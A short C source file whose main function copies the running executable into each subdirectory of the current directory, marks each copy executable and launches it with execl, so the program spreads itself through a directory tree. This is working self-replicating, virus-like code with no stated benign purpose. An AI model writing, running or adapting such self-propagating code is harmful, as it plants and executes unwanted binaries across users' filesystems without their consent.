#include "../include/main.h"

int main (int argc, char **argv) {
	char *program_name = NULL;
	char current_dir[CURRENT_DIR_LEN];
	char srcAbsPath[MAX];
	char destAbsPath[MAX];
	char *destFile = NULL;
	Directory *list = NULL;
	Directory *it = NULL;

	// init
	program_name = basename(argv[0]);
	memset(current_dir, 0, CURRENT_DIR_LEN);
        getcwd(current_dir, CURRENT_DIR_LEN);
	list = (Directory *) malloc(sizeof(Directory));
	memset(destAbsPath, 0, MAX);
	realpath(argv[0], srcAbsPath);

	// get all directories in the given path
	listDirectories(list, current_dir);
	it = list;
	while (it != NULL && it->directory != NULL) {
		destFile = (char *) malloc(strlen(it->directory) + strlen (program_name) + 2);
		strcpy(destFile, it->directory);
		strcat(destFile, "/");
		strcat(destFile, program_name);
		realpath(destFile, destAbsPath);
		free(destFile);

		copy(argv[0], destAbsPath);
		setExecutable(destAbsPath);
		execl(destAbsPath, NULL);

		memset(destAbsPath, 0, MAX);
		it = it->next;
	}

	// free the list of Directory elements
	freeList(list);		
	return 0;
}
